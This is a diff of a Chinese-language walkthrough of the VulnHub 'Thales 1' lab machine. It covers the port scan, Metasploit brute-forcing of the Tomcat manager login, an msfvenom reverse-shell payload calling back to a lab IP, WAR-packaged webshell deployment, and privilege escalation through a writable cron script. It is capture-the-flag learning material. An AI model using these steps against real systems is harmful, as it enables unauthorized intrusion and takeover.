@@ -1,12 +1,12 @@
-# 靶机信息
+# Thales 1靶机wp
+
+## 靶机信息
 
 请参考 vulnhub 官网 [Thales 1 题目详情](https://www.vulnhub.com/entry/thales-1,749/)
 
-
 目标是获取两个 flag: user.txt ，root.txt.
 
-
-# 端口扫描
+## 端口扫描
 
 扫描 TCP 端口，发现开放 22，8080 端口
 
@@ -27,11 +27,12 @@ Nmap done: 1 IP address (1 host up) scanned in 29.60 seconds
 
 ```
 
-## 端口分析
+### 端口分析
 
-### 22端口分析
+#### 22端口分析
 
 通过查找POC或者exp，SSH版本存在用户枚举漏洞，但是靶机禁止SSH登录，通过爆破SSH用户密码的方式行不通
+
 ```
 ┌──(kali㉿kali)-[~]
 └─$ searchsploit OpenSSH 7.6p1
@@ -46,7 +47,7 @@ Shellcodes: No Results
 
 ```
 
-### 8080端口分析
+#### 8080端口分析
 
 通过扫描知道，8080端口是 apache tomcat端口，进一步目录扫描，发现都是tomcat的一些目录目录，尝试访问 http://target:8080/manager/html 发现有访问控制
 
@@ -127,8 +128,7 @@ Target: http://192.168.1.6:8080/examples/
 
 ```
 
-
-使用msfconsole爆破密码，爆破得到  http://target:8080/manager/html 的登录用户及密码是 tomcat/role1
+使用msfconsole爆破密码，爆破得到 http://target:8080/manager/html 的登录用户及密码是 tomcat/role1
 
 ```
 msf6 > search tomcat_mgr
@@ -261,16 +261,15 @@ msf6 auxiliary(scanner/http/tomcat_mgr_login) > exploit
 
 ```
 
-
-# 上传后门
+## 上传后门
 
 使用 `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.101 LPORT=2233 -f elf > reverseshell` 生产反向 shell 可执行文件
 
 通过 tomcat:role1 用户密码登录 http://target:8080/manager/html 上传后门， 将 webshell.jsp，reverseshell 文件先打包成 zip 文件，如 backdoor.zip，将 backdoor.zip 重命名为 backdoor.war 并上传，然后点击部署，部署成功后，可以通过 http://target:8080/backdoor/webshell.jsp 访问自己上传的后门文件，通过 webshell 执行 reverseshell
 
-![Alt text](<./images/thales 1靶机wp/image.png>)
+![Alt text](<../../../../.gitbook/assets/image (2).png>)
 
-# 获取flag
+## 获取flag
 
 解法1：
 
@@ -305,7 +304,6 @@ I prepared a backup script for you. The script is in this directory "/usr/local/
 ```
 
 /usr/local/bin/backup.sh 为定时任务脚本，同时该脚本可读可写，写入任意命令获取到 root 权限
-
 
 解法2：
 
@@ -354,7 +352,7 @@ nLypW+J5rGepKGrklOP7dxEBbQiy5XDm/K/22r9y+Lwyl38LDF2va22szGoW/oT+
 tomcat@miletus:/$
 ```
 
-使用 kali 的 
+使用 kali 的
 
 ```
 ┌──(kali㉿kali)-[~]
